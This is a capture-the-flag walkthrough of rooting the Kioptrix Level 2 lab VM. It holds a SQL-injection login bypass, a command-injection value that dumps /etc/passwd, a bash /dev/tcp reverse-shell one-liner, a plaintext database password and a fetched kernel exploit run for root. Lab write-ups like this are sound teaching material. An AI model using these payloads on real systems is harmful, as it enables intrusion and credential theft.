---
layout: single
title: Kioptrix Level 2 CTF Walkthrough
date: 2017-07-30
categories:
  - security
  - ctf
  - walkthrough
tags:
  - kioptrix
  - vulnhub
---
## Service Discovery & Authentication Bypass
An Nmap scan [`nmap -sS -sV -T4 -Pn -vv 192.168.22.130`] revealed a number of different services running on the machine and fingerprinted the machine as running CentOS:

```
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 64 OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     syn-ack ttl 64 Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  syn-ack ttl 64 2 (RPC #100000)
443/tcp  open  ssl/http syn-ack ttl 64 Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      syn-ack ttl 64 CUPS 1.1
3306/tcp open  mysql    syn-ack ttl 64 MySQL (unauthorized)
```

Navigating to the default page of the web server presented me with a login panel, which was not sanitising user input. I was able to bypass the login page by using `admin` as the username and `'or'a'='a` as the password.

## Exploiting The Web Application
Once past the login screen, the web server presented me with a form which allowed me to ping other machines. Passing a valid IP address to this form resulted in output that looks like the standard output of the `ping` command:

```http
HTTP/1.1 200 OK
Date: Sun, 30 Jul 2017 12:36:41 GMT
Server: Apache/2.0.52 (CentOS)
X-Powered-By: PHP/4.3.9
Content-Length: 430
Connection: close
Content-Type: text/html; charset=UTF-8

192.168.22.129<pre>PING 192.168.22.129 (192.168.22.129) 56(84) bytes of data.
64 bytes from 192.168.22.129: icmp_seq=0 ttl=64 time=1.01 ms
64 bytes from 192.168.22.129: icmp_seq=1 ttl=64 time=0.274 ms
64 bytes from 192.168.22.129: icmp_seq=2 ttl=64 time=0.261 ms

--- 192.168.22.129 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2000ms
rtt min/avg/max/mdev = 0.261/0.517/1.018/0.354 ms, pipe 2
</pre>
```

As the input was seemingly being passed directly to a system command, I tweaked the POST request to `pingit.php` in Burp so that the `ip` field had a value of `192.168.22.129; cat /etc/passwd` and as expected, the response from the server contained the contents of `/etc/passwd`; meaning it was vulnerable to command injection:

```http
HTTP/1.1 200 OK
Date: Sun, 30 Jul 2017 12:41:01 GMT
Server: Apache/2.0.52 (CentOS)
X-Powered-By: PHP/4.3.9
Content-Length: 2220
Connection: close
Content-Type: text/html; charset=UTF-8

192.168.22.129; cat /etc/passwd<pre>PING 192.168.22.129 (192.168.22.129) 56(84) bytes of data.
64 bytes from 192.168.22.129: icmp_seq=0 ttl=64 time=0.964 ms
64 bytes from 192.168.22.129: icmp_seq=1 ttl=64 time=0.230 ms
64 bytes from 192.168.22.129: icmp_seq=2 ttl=64 time=0.215 ms

--- 192.168.22.129 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2000ms
rtt min/avg/max/mdev = 0.215/0.469/0.964/0.350 ms, pipe 2
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
rpm:x:37:37::/var/lib/rpm:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
squid:x:23:23::/var/spool/squid:/sbin/nologin
webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
john:x:500:500::/home/john:/bin/bash
harold:x:501:501::/home/harold:/bin/bash
</pre>
```

With this vulnerability confirmed, I started a listener on my local machine using `ncat -v -n -l -p 5555` and altered the POST request again to establish a reverse TCP shell using the command `bash -i >& /dev/tcp/192.168.22.129/5555 0>&1` which established a shell running as `apache` in `/var/www/html`:

```shell_session
root@kali:~# ncat -v -n -l -p 5555
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 192.168.22.130.
Ncat: Connection from 192.168.22.130:32771.
bash: no job control in this shell
bash-3.00$ whoami
apache
bash-3.00$ pwd
/var/www/html
bash-3.00$
```

## Privilege Escalation
Looking at the contents of `index.php` revealed the password for the MySQL user `john` in the call to `mysql_connect`: `mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());`

As this user also exists in `/etc/passwd`, I attempted to authenticate as `john` to see if there were any sudo rights which may help escalate further; but the passwords appeared to be different:

```shell_session
bash-3.00$ python -c 'import pty; pty.spawn("/bin/bash")'
bash-3.00$ su john
su john
Password: hiroshima

su: incorrect password
bash-3.00$
```

Next, I found a kernel exploit (https://www.exploit-db.com/exploits/9545/) which affects a wide range of versions, including the kernel the machine is using.

I started a local web server to transfer the exploit (`python -m SimpleHTTPServer 80`) and then proceeded to download it on the target, compile it, and execute it to get a root shell:

```shell_session
bash-3.00$ cd /dev/shm
bash-3.00$ wget 192.168.22.129/ssp.c
--10:03:22--  http://192.168.22.129/ssp.c
           => `ssp.c'
Connecting to 192.168.22.129:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9,409 (9.2K) [text/plain]

    0K .........                                             100%  897.31 MB/s

10:03:22 (897.31 MB/s) - `ssp.c' saved [9409/9409]

bash-3.00$ gcc ssp.c -o ssp
bash-3.00$ ./ssp
sh: no job control in this shell
sh-3.00# whoami
root
sh-3.00#
```
